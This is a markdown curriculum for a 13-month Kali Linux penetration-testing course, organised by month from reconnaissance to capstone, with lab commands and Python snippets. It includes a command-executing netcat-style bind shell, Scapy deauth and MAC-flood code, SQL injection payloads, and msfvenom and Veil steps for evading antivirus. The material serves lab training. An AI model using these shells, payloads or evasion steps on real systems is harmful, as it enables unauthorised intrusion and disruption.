# Study Plan — 13-Month Deep Dive

> Week-by-week curriculum to master every Kali Linux tool from scratch.

**Duration:** ~13 Months · **Approach:** Theory → Lab → CTF → Report  
**Prerequisites:** Basic Linux CLI, TCP/IP networking fundamentals, Python basics

**Primary Resources:**
- [freeCodeCamp: Kali Linux Course](https://youtu.be/ug8W0sFiVJo) — free, 4h, English
- [Udemy: Hacker Ético Profissional com Kali Linux v2025](https://www.udemy.com/course/hacker-etico-profissional/) — Vitor Mazuco, 241 lectures, PT-BR
- [InfoSecLab Vulnerability Testing](https://pontocom.gitbook.io/infoseclab/vulntesting/intro) — university lab guide, PT

---

## Roadmap

```
Week 0      →  Prerequisites + Pentest Theory Foundations
Month 1-2   →  Information Gathering
Month 3     →  Vulnerability Analysis
Month 4     →  Web Application Testing
Month 5     →  Password Attacks
Month 6     →  Wireless Attacks
Month 7     →  Exploitation
Month 8     →  Python for Hacking          ← NEW
Month 9     →  Sniffing & Spoofing
Month 10    →  Anonymity, OPSEC & Evasion  ← EXPANDED
Month 11    →  Digital Forensics
Month 12    →  Reverse Engineering & Reporting
Month 13    →  Capstone — Full Pentest + Bug Bounty
```

---

## Week 0 — Prerequisites & Theory Foundations

Before starting any tool, build a solid theoretical foundation. Real penetration testers think in frameworks, not just commands.

### Setup Checklist
- [ ] Kali Linux installed (bare metal, VM, or WSL)
- [ ] Docker + docker-compose set up (see [Docker Lab](../docker-lab/README.md))
- [ ] Comfortable with: `ls`, `cd`, `grep`, `cat`, `chmod`, `sudo`, pipes
- [ ] Basic networking: OSI model, TCP/IP, DNS, HTTP/S, subnetting

**Free resources to fill gaps:**
- [OverTheWire: Bandit](https://overthewire.org/wargames/bandit/) — Linux wargame
- [freeCodeCamp: Linux Basics for Hackers](https://www.freecodecamp.org/news/linux-basics/) — free article
- Professor Messer Network+ — free YouTube series
- [freeCodeCamp: Kali Linux Course](https://youtu.be/ug8W0sFiVJo) — covers terminal basics

**Girus warm-up labs (interactive, in-browser — no setup required):**

| Girus Lab ID | What it covers | Week 0 skill |
|-------------|----------------|-------------|
| `linux-comandos-basicos` | `ls`, `cd`, `cp`, `mv`, pipes, redirection | Core CLI fluency |
| `linux-permissoes-arquivos` | `chmod`, `chown`, SUID/SGID/sticky bit | File permissions |
| `linux-gerenciamento-processos` | `ps`, `kill`, `top`, signals, background jobs | Process management |
| `linux-monitoramento-sistema` | `ss`, `netstat`, `journalctl`, resource monitoring | Network and system monitoring |
| `docker-fundamentos` | `docker run`, `ps`, `stop`, `rm`, image lifecycle | Docker basics for the lab |

```bash
# Launch Girus and start with Linux basics
girus list clusters    # Confirm cluster is active
girus lab start linux-comandos-basicos
xdg-open http://localhost:8000
```

See [`docker-lab/girus-warmups.md`](../docker-lab/girus-warmups.md) for the full guided exercise guide.

### Pentest Methodology Theory

Study these three frameworks before touching any tool. They explain *why* you do things in a specific order.

#### Cyber Kill Chain (Lockheed Martin)

The 7-step model describing how attackers progress through an intrusion:

| Step | Phase | Description |
|------|-------|-------------|
| 1 | Reconnaissance | Gather info about target (OSINT, scanning) |
| 2 | Weaponization | Create exploit + payload (malware, office macro) |
| 3 | Delivery | Deliver weapon to target (email, USB, web) |
| 4 | Exploitation | Execute code on victim system |
| 5 | Installation | Install malware/backdoor for persistence |
| 6 | Command & Control (C2) | Remote control of compromised system |
| 7 | Actions on Objectives | Exfiltrate data, ransomware, lateral movement |

> This study plan follows the Kill Chain: Months 1-2 = Recon, Month 7 = Exploitation/Installation, Month 8 = Python tooling for C2, Month 9 = Sniffing = C2 monitoring.

#### MITRE ATT&CK Framework

A comprehensive knowledge base of real adversary tactics, techniques, and procedures (TTPs). 14 tactic categories:

```
TA0043  Reconnaissance          TA0001  Initial Access
TA0002  Execution               TA0003  Persistence
TA0004  Privilege Escalation    TA0005  Defense Evasion
TA0006  Credential Access       TA0007  Discovery
TA0008  Lateral Movement        TA0009  Collection
TA0011  Command and Control     TA0010  Exfiltration
TA0040  Impact                  TA0042  Resource Development
```

- Browse at: [attack.mitre.org](https://attack.mitre.org)
- Use ATT&CK Navigator to map your lab exercises to real TTPs

#### PTES — Penetration Testing Execution Standard

The industry-standard methodology for conducting professional engagements:

| Phase | Description |
|-------|-------------|
| Pre-Engagement | Scope, rules of engagement, legal authorization |
| Intelligence Gathering | Passive + active recon (Months 1-2) |
| Threat Modeling | Identify most valuable targets and attack paths |
| Vulnerability Identification | Scanning and analysis (Month 3) |
| Exploitation | Gain access (Month 7) |
| Post-Exploitation | Priv esc, lateral movement, persistence |
| Reporting | Document findings with business impact (Month 12) |

- Full standard: [http://www.pentest-standard.org](http://www.pentest-standard.org)

**Udemy alignment:** Sections 1-3 of "Hacker Ético Profissional" cover lab setup, anonymity theory, and Kali orientation before any attacks.  
**InfoSecLab alignment:** [Intro page](https://pontocom.gitbook.io/infoseclab/vulntesting/intro) covers Cyber Kill Chain and PTES as foundation.

---

## Month 1–2: Information Gathering

**Tools:** Nmap · hping3 · Recon-ng · Maltego · theHarvester · Spiderfoot · Amass · dmitry · EyeWitness · Maigret · GooFuzz · Shodan · wafw00f  
**Docker Lab:** `./lab.sh start web` then scan `10.10.0.0/24`  
**InfoSecLab Target:** Metasploitable 2 at `10.10.0.25` (add via `./lab.sh start network`)

### Week 1–2: Nmap & hping3

**Nmap:**
- Scan types: `-sS`, `-sV`, `-sC`, `-O`, `-A`, `-p-`
- Timing: `-T0` to `-T5`; output: `-oN`, `-oX`, `-oG`
- NSE scripts: `--script=vuln`, `--script=http-title`, `--script=smb-enum-shares`
- **Lab:** Full scan of all Docker containers, document every service

**hping3** (raw packet crafting + active probing):
- TCP/UDP/ICMP packet crafting for firewall testing and OS fingerprinting
- Port scanning with custom flags, DoS simulation (lab only)
- See [cheatsheets/hping3.md](../cheatsheets/hping3.md)
- **Lab:** Compare hping3 vs Nmap results against Metasploitable 2

**InfoSecLab:** [Nmap scanning guide](https://pontocom.gitbook.io/infoseclab/vulntesting/scanning) · [hping3 guide](https://pontocom.gitbook.io/infoseclab/vulntesting/hping3)

### Week 3: OSINT — theHarvester, Amass, Recon-ng, dmitry

- Passive vs active recon; OSINT sources: Shodan, crt.sh, Google Dorks
- `theHarvester -d example.com -b all` — emails, subdomains, IPs
- `amass enum -d example.com` — passive + active subdomain enumeration
- `dmitry -winsepfb example.com` — full OSINT sweep in one command (see [cheatsheets/dmitry.md](../cheatsheets/dmitry.md))
- Recon-ng workspaces, modules, API keys
- **Lab:** Bug bounty target (in-scope) — enumerate subdomains and emails
- **InfoSecLab:** [theHarvester](https://pontocom.gitbook.io/infoseclab/vulntesting/theharvester) · [dmitry](https://pontocom.gitbook.io/infoseclab/vulntesting/dmitry) · [Recon-ng](https://pontocom.gitbook.io/infoseclab/vulntesting/recon-ng)

### Week 4: Maltego, Shodan, Google Dorks & Advanced OSINT

**Maltego:**
- Entity relationships and transforms
- People → email → domain → IP → ASN pivoting
- **InfoSecLab:** [Maltego guide](https://pontocom.gitbook.io/infoseclab/vulntesting/maltego)

**Shodan CLI:**
```bash
shodan search "apache 2.4 country:PT"
shodan search "port:22 org:\"Vodafone\""
shodan host 8.8.8.8
shodan count "webcam has_vuln:true"
shodan search "Metasploitable" --fields ip_str,port,org
```

**Google Dorks / GHDB:**
```
site:example.com filetype:pdf
intitle:"index of" "password"
inurl:"/wp-admin/install.php"
filetype:sql "INSERT INTO"
intext:"powered by" "phpMyAdmin"
```
- Google Hacking Database: [https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)
- **InfoSecLab:** [OSINT / Shodan](https://pontocom.gitbook.io/infoseclab/vulntesting/shodan)

**Additional OSINT tools:**
- `EyeWitness` — screenshot web services and RDP, group by technology
- `Maigret` — username OSINT across 3000+ sites
- `GooFuzz` — Google dorking automation
- `wafw00f` — detect WAF presence before scanning

**Udemy alignment:** Sections 4 (Information Gathering) and 5 (OSINT) cover theHarvester, Maltego, Shodan, GHDB, and ZAP spidering.

**SNMP Enumeration:**
```bash
# Enumerate SNMP community strings
snmpwalk -c public -v1 10.10.0.25
snmpwalk -c public -v2c 10.10.0.25 1.3.6.1.2.1.25.4.2.1.2
# Enumerate with snmpenum
snmpenum 10.10.0.25 public linux.txt
```

**Milestone:** Full recon report on a practice target using all tools. Map findings to MITRE ATT&CK TA0043 (Reconnaissance).

**freeCodeCamp alignment:** The [Kali Linux course](https://youtu.be/ug8W0sFiVJo) covers Nmap port scanning directly in its "Introduction to Nmap" and "Scan Ports" sections.

---

## Month 3: Vulnerability Analysis

**Tools:** Nikto · OpenVAS/GVM · Nessus · Legion · Lynis  
**Docker Lab:** `./lab.sh start web` — scan DVWA, Mutillidae, WordPress  
**InfoSecLab Target:** Metasploitable 2 at `10.10.0.25`

### Vulnerability Scoring Frameworks

Before scanning, understand how vulnerabilities are measured:

| Standard | Description |
|----------|-------------|
| CVE | Common Vulnerabilities and Exposures — unique identifier per vuln |
| CVSS | Common Vulnerability Scoring System — 0.0-10.0 severity score |
| CWE | Common Weakness Enumeration — weakness classification |
| CPE | Common Platform Enumeration — standardized software names |
| OVAL | Open Vulnerability and Assessment Language — XML check definitions |
| SCAP | Security Content Automation Protocol — ties CVE/CVSS/CCE/XCCDF together |

CVSS v3 severity bands: `Critical (9-10)` · `High (7-8.9)` · `Medium (4-7.9)` · `Low (0.1-3.9)`

### Week 1: Nikto

- Web server fingerprinting, dangerous files, CVE detection
- **Lab:** Scan all web containers, compare findings
- **Lab:** `nikto -h http://10.10.0.25` — scan Metasploitable 2 HTTP service

### Week 2: OpenVAS / GVM (InfoSecLab Lab)

Following the InfoSecLab step-by-step approach:

```bash
# 1. Install and setup
sudo apt install gvm -y
sudo gvm-setup      # creates admin password, downloads NVT feeds (~20 min)
sudo gvm-start

# 2. Access web UI
# https://localhost:9392  (admin / <password from setup>)
```

**OpenVAS scan workflow (web UI):**
1. **Configuration → Targets** — create target: Name=`Metasploitable2`, Host=`10.10.0.25`
2. **Scans → Tasks** — New Task: Target=Metasploitable2, Scanner=OpenVAS Default, Config=Full and Fast
3. Launch scan, wait for completion
4. **Reports** — view findings, filter by CVSS ≥ 7.0
5. Export as PDF for your report

```bash
# CLI alternative
gvm-cli --gmp-username admin --gmp-password <pass> socket \
  --xml "<create_target><name>ms2</name><hosts>10.10.0.25</hosts></create_target>"
```

**InfoSecLab reference:** [OpenVAS guide](https://pontocom.gitbook.io/infoseclab/vulntesting/openvas)

### Week 3: Nessus Essentials

```bash
# Install Nessus Essentials (free, up to 16 IPs)
# Download .deb from https://www.tenable.com/products/nessus/nessus-essentials
dpkg -i Nessus-*.deb
sudo systemctl start nessusd
# Access: https://localhost:8834
# Register for free activation code at tenable.com
```

**Nessus scan workflow:**
1. **New Scan → Basic Network Scan** — enter `10.10.0.25`
2. **New Scan → Web Application Tests** — enter DVWA URL
3. **New Scan → Credentialed Patch Audit** — add SSH credentials for deeper scan
4. Review findings by plugin family, severity, CVE
5. **Report → PDF** — export for documentation

**Comparison:** Nessus vs OpenVAS — both cover the same CVEs; Nessus has better compliance plugins (PCI, CIS), OpenVAS is fully free.

**InfoSecLab reference:** [Nessus guide](https://pontocom.gitbook.io/infoseclab/vulntesting/nessus)

### Week 4: Lynis & Legion

- System hardening audits with Lynis
- Semi-automated network scanning with Legion
- **Milestone:** Vulnerability assessment report with CVEs, CVSS scores, and remediation recommendations. Map to MITRE ATT&CK TA0007 (Discovery).

---

## Month 4: Web Application Testing

**Tools:** Burp Suite · OWASP ZAP · SQLmap · WPScan · Gobuster · ffuf · Wfuzz · Dirb  
**Docker Lab:** DVWA (8080), WebGoat (8081), Juice Shop (3000), WordPress (8083)

### Week 1: Burp Suite
- Proxy, Repeater, Intruder, Scanner
- OWASP Top 10 walkthrough on DVWA
- **Resource:** [PortSwigger Web Security Academy](https://portswigger.net/web-security) (free)

### Week 2: OWASP ZAP — Automated + Manual Scanning
- Active scan, passive scan, spider
- AJAX Spider for JavaScript-heavy apps (SPA)
- Fuzzer for input validation testing
- **Udemy alignment:** Section 5 covers ZAP crawling, AJAX Spider, active scanning
- **Lab:** Full ZAP scan of Juice Shop (port 3000), document all findings

### Week 3: SQLmap & WPScan
- SQL injection enumeration and exploitation
- WordPress user/plugin/theme enumeration and brute-force

### Week 4: Content Discovery (Gobuster / ffuf / Wfuzz / Dirb)
- Directory and file fuzzing with wordlists
- DNS subdomain brute-forcing
- **Milestone:** Complete 10 PortSwigger labs: SQLi, XSS, CSRF, IDOR, SSRF

---

## Month 5: Password Attacks

**Tools:** John the Ripper · Hashcat · Hydra · Medusa · CeWL · Crunch  
**Docker Lab:** `./lab.sh start passwords` — crack hashes from hash server (port 8087)

### Week 1: John & Hashcat
- Hash identification, dictionary attacks, rule-based attacks
- GPU acceleration with Hashcat; CPU with John
- **Resource:** [freeCodeCamp: How to Crack Hashes with Hashcat](https://www.freecodecamp.org/news/hacking-with-hashcat-a-practical-guide/)

### Week 2: Hydra & Medusa
- SSH, FTP, HTTP form brute-force
- **Resource:** [freeCodeCamp: How to Use Hydra](https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/)
- **Lab:** Brute-force SSH container (port 2223) and WordPress (port 8083)
- **Lab:** Brute-force Metasploitable 2 SSH (`10.10.0.25:22`) with common creds

### Week 3: CeWL & Crunch
- Generate custom wordlists from target websites
- Pattern-based wordlist generation
- **Milestone:** Crack all hashes from a retired HTB machine

---

## Month 6: Wireless Attacks

**Tools:** Aircrack-ng · Kismet · Wifite · Fern WiFi Cracker · Bully  
**Requirement:** WiFi adapter with monitor mode (e.g., Alfa AWUS036ACH) + test AP

> **Note:** No Docker equivalent for wireless — requires real hardware. Set up a test AP with a known password.

### Week 1: Aircrack-ng Suite
- Monitor mode, packet capture, WPA2 handshake capture
- De-authentication attacks, dictionary cracking
- **freeCodeCamp alignment:** Entire wireless section of the [Kali course](https://youtu.be/ug8W0sFiVJo) maps directly here:
  - "Introduction to Aircrack-ng" ✓
  - "Monitor Mode vs Managed Mode" ✓
  - "Enable Monitor Mode" ✓
  - "Scan Wi-Fi Networks & Capture Traffic" ✓
  - "What is a 4-Way Handshake" ✓
  - "Capture 4-Way Handshake Using De-authentication Attack" ✓
  - "Wordlists & Dictionary Attacks" ✓
  - "Crack / Recover Wi-Fi Password" ✓
  - "Detect De-authentication Attacks" ✓
- **Resource:** [freeCodeCamp: Wi-Fi Hacking 101](https://www.freecodecamp.org/news/wi-fi-hacking-101/)

### Week 2: Wifite & Kismet
- Automated WPA/WEP/WPS attacks
- Passive wireless monitoring and IDS

### Week 3: Fern & Bully
- GUI-based auditing with Fern
- WPS PIN brute-force with Bully
- **Milestone:** Capture and crack a WPA2 handshake on your test AP

---

## Month 7: Exploitation

**Tools:** Metasploit Framework · BeEF · SearchSploit · RouterSploit · Commix  
**Docker Lab:** `./lab.sh start network` — Metasploitable2, Metasploitable3, SSH, FTP, API

### Week 1: Metasploit Framework
- Architecture: modules, payloads, encoders, post-exploitation
- Meterpreter shell, privilege escalation, persistence
- **Lab:** Exploit Metasploitable 2 (`10.10.0.25`) — `vsftpd 2.3.4` backdoor, UnrealIRCd, etc.
- **Lab:** Exploit Metasploitable3 (`10.10.0.20`) end-to-end
- **Udemy alignment:** Section 6 (Metasploit), Section 7 (Bypass AV with encoders/Veil)

### Week 2: SearchSploit & BeEF
- Offline Exploit-DB search and customization
- Browser hooking and social engineering with BeEF

### Week 3: RouterSploit & Commix
- Embedded device exploitation
- Command injection automation
- **Milestone:** Full compromise chain: access → priv esc → persistence → evidence. Map TTPs to MITRE ATT&CK.

---

## Month 8: Python for Hacking (NEW)

**Language:** Python 3 · **Libraries:** Scapy, socket, requests, paramiko, impacket  
**Udemy alignment:** Sections 19-27 of "Hacker Ético Profissional" (9 sections, ~60 lectures)

> Building your own tools makes you a better tester — you understand exactly what's happening at the packet level.

### Week 1: Network Fundamentals in Python

**TCP/UDP Clients & Server Sockets:**
```python
import socket
# TCP client
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.0.25", 80))
s.send(b"GET / HTTP/1.1\r\nHost: 10.10.0.25\r\n\r\n")
print(s.recv(4096).decode())

# UDP client
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b"ping", ("10.10.0.25", 53))
```

**DNS / Whois lookups:**
```python
import socket, whois
print(socket.gethostbyname("example.com"))
w = whois.whois("example.com")
print(w.registrar, w.creation_date)
```

**Port scanner:**
```python
import socket
for port in range(1, 1025):
    s = socket.socket()
    s.settimeout(0.5)
    if s.connect_ex(("10.10.0.25", port)) == 0:
        print(f"[+] Port {port} open")
    s.close()
```

### Week 2: Packet Crafting & Sniffing with Scapy

**IP/ICMP decoder:**
```python
from scapy.all import *
import socket, struct

def packet_callback(pkt):
    if pkt.haslayer(IP):
        print(f"{pkt[IP].src} -> {pkt[IP].dst} | Proto: {pkt[IP].proto}")

sniff(prn=packet_callback, count=10)
```

**Custom ping sweep:**
```python
from scapy.all import IP, ICMP, sr1
for i in range(1, 255):
    pkt = IP(dst=f"10.10.0.{i}")/ICMP()
    resp = sr1(pkt, timeout=1, verbose=0)
    if resp:
        print(f"[+] 10.10.0.{i} is alive")
```

**Netcat clone in Python:**
```python
import socket, subprocess, sys

def server_mode(port):
    s = socket.socket()
    s.bind(("0.0.0.0", port))
    s.listen(1)
    conn, addr = s.accept()
    while True:
        cmd = conn.recv(1024).decode()
        result = subprocess.run(cmd, shell=True, capture_output=True)
        conn.send(result.stdout + result.stderr)
```

**Udemy:** Section 20 (TCP client), Section 21 (UDP client), Section 22 (Netcat clone), Section 23 (Packet sniffer), Section 24 (IP/ICMP decoder)

### Week 3: Credential Attacks & Web App Assessment

**SMTP VRFY user enumeration:**
```python
import socket

def smtp_vrfy(host, user):
    s = socket.socket()
    s.connect((host, 25))
    s.recv(1024)
    s.send(f"VRFY {user}\r\n".encode())
    resp = s.recv(1024).decode()
    if "252" in resp or "250" in resp:
        print(f"[+] User exists: {user}")
    s.close()
```

**Directory brute-forcer:**
```python
import requests

wordlist = open("/usr/share/wordlists/dirb/common.txt").read().splitlines()
for word in wordlist:
    url = f"http://10.10.0.25/{word}"
    r = requests.get(url, timeout=2)
    if r.status_code == 200:
        print(f"[+] Found: {url}")
```

**Backup file finder:**
```python
extensions = [".bak", ".old", ".orig", ".backup", "~", ".swp"]
files = ["index", "config", "login", "admin", "database"]
for f in files:
    for ext in extensions:
        url = f"http://10.10.0.25/{f}{ext}"
        r = requests.get(url)
        if r.status_code == 200:
            print(f"[+] Backup found: {url}")
```

**Udemy:** Section 25 (SMTP VRFY), Section 26 (web dir brute-force, HeartBleed check)

### Week 4: Wireless Pentesting, SQLi Detection & DoS Scripts

**Wireless with Scapy (monitor mode required):**
```python
from scapy.all import *

# Deauth attack (lab only!)
def deauth(target_mac, ap_mac, iface="wlan0mon"):
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)\
          /Dot11Deauth(reason=7)
    sendp(pkt, iface=iface, count=100, inter=0.1)

# MAC flood
def mac_flood(iface="wlan0mon"):
    while True:
        src = RandMAC()
        pkt = Ether(src=src, dst="ff:ff:ff:ff:ff:ff")/IP()/ICMP()
        sendp(pkt, iface=iface, verbose=0)
```

**SQL injection detection:**
```python
import requests
payloads = ["'", "\"", "' OR '1'='1", "' OR 1=1--", "1; DROP TABLE users--"]
for p in payloads:
    r = requests.get(f"http://10.10.0.10/login.php?user={p}")
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[+] Possible SQLi with payload: {p}")
```

**HTTP header manipulation:**
```python
import requests
headers = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "Referer": "https://www.google.com"
}
r = requests.get("http://10.10.0.25/admin", headers=headers)
print(r.status_code, r.text[:200])
```

**Udemy:** Section 27 (wireless Scapy), Section 28 (SQLi), Section 29 (DoS), Section 30 (HTTP headers), Section 31 (cryptography/hashing)

**Milestone:** Build a personal Python toolkit with: port scanner, directory fuzzer, SMTP enumerator, packet sniffer. Push to your GitHub.

**Resource:** [tools-reference/11-python-hacking.md](../tools-reference/11-python-hacking.md)

---

## Month 9: Sniffing & Spoofing

**Tools:** Wireshark · Ettercap · Responder · Bettercap · tcpdump · Yersinia  
**Docker Lab:** Capture traffic on `docker0` interface while attacking lab containers

### Week 1: Wireshark & tcpdump
- Protocol analysis, filter syntax, credential capture
- **freeCodeCamp alignment:** "Wireshark Tutorial" section of the [Kali course](https://youtu.be/ug8W0sFiVJo) maps here ✓
- **Udemy alignment:** Section 17 covers Wireshark — protocol analysis of attack traffic
- **Lab:** Analyze PCAPs from [PicoCTF](https://picoctf.org) challenges

### Week 2: Ettercap & Bettercap
- ARP poisoning, MITM, SSL stripping
- **Lab:** MITM against DVWA container, capture login credentials

### Week 3: Responder & Yersinia
- LLMNR/MDNS/NBT-NS poisoning, NTLM hash capture
- Layer 2 protocol attacks
- **Milestone:** Capture and crack credentials via MITM in lab

---

## Month 10: Anonymity, OPSEC & Evasion

**Tools:** Tor · ProxyChains · Macchanger · Nipe · VPN clients  
**Udemy alignment:** Section 18 (Tor, ProxyChains, Macchanger, Nipe)

> Understanding anonymity tools is essential for OPSEC — whether you're a red teamer who needs to hide footprints or a blue teamer defending against evasion.

### Week 1: Tor & ProxyChains

**Tor setup on Kali:**
```bash
sudo apt install tor -y
sudo systemctl start tor
# SOCKS5 proxy now running on 127.0.0.1:9050
```

**ProxyChains configuration:**
```bash
# Edit /etc/proxychains4.conf
# Change: strict_chain (all must work) or dynamic_chain (skip dead ones)
# Under [ProxyList] add:
# socks5  127.0.0.1  9050   ← Tor

# Use any tool through Tor:
proxychains nmap -sT -p 80,443 example.com
proxychains theHarvester -d example.com -b google
proxychains curl ifconfig.me   # confirm different IP
```

**ProxyChain types:**
- `strict_chain` — all proxies in order, all must respond
- `dynamic_chain` — skip dead proxies, use available ones
- `random_chain` — randomize order each connection

**Multi-hop ProxyChains (maximum anonymity):**
```
socks5  127.0.0.1  9050   ← Tor exit
socks5  proxy1.example.com  1080  ← additional hop
http    proxy2.example.com  3128  ← HTTP proxy
```

### Week 2: Macchanger & VPN

**Macchanger:**
```bash
# Show current MAC
macchanger -s eth0

# Randomize MAC address
sudo ip link set eth0 down
sudo macchanger -r eth0
sudo ip link set eth0 up

# Set specific MAC
sudo macchanger -m 00:11:22:33:44:55 eth0

# Reset to permanent/original MAC
sudo macchanger -p eth0
```

**VPN on Kali (OpenVPN):**
```bash
sudo apt install openvpn -y
sudo openvpn --config client.ovpn
# Verify: curl ifconfig.me
```

**Nipe — route all traffic through Tor:**
```bash
git clone https://github.com/htrgouvea/nipe.git
cd nipe && sudo cpan install Switch JSON LWP::UserAgent
sudo perl nipe.pl install
sudo perl nipe.pl start
sudo perl nipe.pl status
```

### Week 3: Evasion & Bypass AV

**Veil-Framework** — generate AV-evading payloads:
```bash
sudo apt install veil -y
veil
# Use: Evasion → python/meterpreter/rev_tcp → generate
```

**msfvenom encoders:**
```bash
# Encode payload to evade signature detection
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -f exe > payload.exe

# Check against VirusTotal (don't do with real engagements)
# Use: antiscan.me or nodistribute.com for testing
```

**Udemy alignment:** Section 7 covers Bypass AV with multiple encoder passes and Veil.

**OPSEC Checklist:**
- [ ] VPN or Tor running before any scanning
- [ ] MAC address randomized on test interfaces
- [ ] Disable WebRTC in browser (leaks real IP through VPN)
- [ ] Use separate VM / Kali instance for each engagement
- [ ] Clear browser history, bash history (`history -c`)
- [ ] Use `--source-ip` in Nmap to control source address
- [ ] Never scan from home IP on real engagements
- [ ] All tools logged to CherryTree per engagement

**Milestone:** Full engagement with Tor/ProxyChains + evasion. Document OPSEC steps taken.

**Resource:** [tools-reference/12-anonymity-opsec.md](../tools-reference/12-anonymity-opsec.md)

---

## Month 11: Digital Forensics

**Tools:** Autopsy · Volatility · Binwalk · Foremost · Sleuth Kit · bulk_extractor  
**Docker Lab:** `./lab.sh start forensics` — serve forensic images locally

### Week 1: Autopsy & Sleuth Kit
- Disk image analysis, timeline, deleted file recovery
- **Lab:** [CyberDefenders](https://cyberdefenders.org) disk forensics challenges

### Week 2: Volatility (Memory Forensics)
- Process listing, network connections, memory dumps, string analysis
- **Lab:** [MemLabs](https://github.com/stuxnet999/MemLabs) challenges

### Week 3: Binwalk & Foremost
- Firmware extraction, file carving, bulk feature extraction
- **Milestone:** Full investigation on a CyberDefenders challenge with written report

---

## Month 12: Reverse Engineering & Reporting

**Tools (RE):** Ghidra · Radare2 · GDB · pwndbg · strace / ltrace  
**Tools (Reporting):** CherryTree · Dradis · Faraday · Pipal  
**Docker Lab:** `./lab.sh start reporting` — Dradis at port 3001

### Week 1: GDB & pwndbg
- Dynamic analysis, breakpoints, stack inspection, exploit dev
- **Lab:** [pwn.college](https://pwn.college) — intro to binary exploitation

### Week 2: Ghidra & Radare2
- Static analysis, decompilation, function renaming
- CLI-based reverse engineering, visual mode
- **Lab:** [crackmes.one](https://crackmes.one) — beginner crackmes

### Week 3–4: Documentation & Dradis
- CherryTree node hierarchy for engagements
- Professional report structure: Executive Summary → Findings → Remediation
- Import Nmap XML, Burp XML, Nikto XML into Dradis
- Collaborative vulnerability tracking in Faraday
- **Milestone:** Document a full VulnHub engagement in Dradis

---

## Month 13: Capstone — Full Pentest + Bug Bounty

Pick a complex retired HTB or VulnHub machine and perform a **complete penetration test**, then try a real Bug Bounty target.

### Part 1: Full Pentest Simulation

1. Scoping — define rules of engagement, targets, timeline
2. Reconnaissance — Nmap, theHarvester, Recon-ng, Amass, Shodan
3. Vulnerability Analysis — Nikto, OpenVAS, Nessus
4. Exploitation — Metasploit, SQLmap, Burp Suite, custom Python exploits
5. Post-Exploitation — privilege escalation, lateral movement, persistence
6. Evidence Collection — screenshots, hash dumps, proof.txt
7. Report — professional pentest report in Dradis with executive summary

### Part 2: Bug Bounty

**Platforms to join:**
- [HackerOne](https://hackerone.com) — largest, best for beginners
- [Bugcrowd](https://bugcrowd.com) — wide variety of programs
- [Intigriti](https://intigriti.com) — European focused
- [YesWeHack](https://yeswehack.com) — growing platform

**First Bug Bounty Checklist:**
- [ ] Read the entire scope and rules of engagement
- [ ] Start with subdomain enumeration (Amass, Subfinder)
- [ ] Run Nuclei templates against in-scope assets
- [ ] Check for IDOR, broken auth, sensitive data exposure
- [ ] Document everything — screenshots, request/response, impact
- [ ] Write a clear, professional report (no junk reports)

**Udemy alignment:** Section 36 covers Bug Bounty methodology end-to-end.

**Resource:** [tools-reference/13-bug-bounty.md](../tools-reference/13-bug-bounty.md)

---

## Weekly Schedule Template

| Day | Activity | Duration |
|-----|---------|---------|
| Monday | Theory & reading | 1–2 hrs |
| Tuesday | Tool practice in Docker lab | 2 hrs |
| Wednesday | CTF challenge / practice platform | 2 hrs |
| Thursday | Tool practice + CherryTree notes | 2 hrs |
| Friday | Review notes, write mini-report | 1 hr |
| Weekend | VulnHub / HTB machine | 3–4 hrs total |

---

## Certifications Roadmap

| Cert | Relevance | Target After |
|------|-----------|-------------|
| CompTIA Security+ | Foundations | Month 2 |
| eJPT (eLearnSecurity) | Entry pentest | Month 5 |
| PNPT (TCM Security) | Practical pentest | Month 9 |
| CEH | Broad coverage | Month 6 |
| OSCP (OffSec) | Industry gold standard | Month 13 |
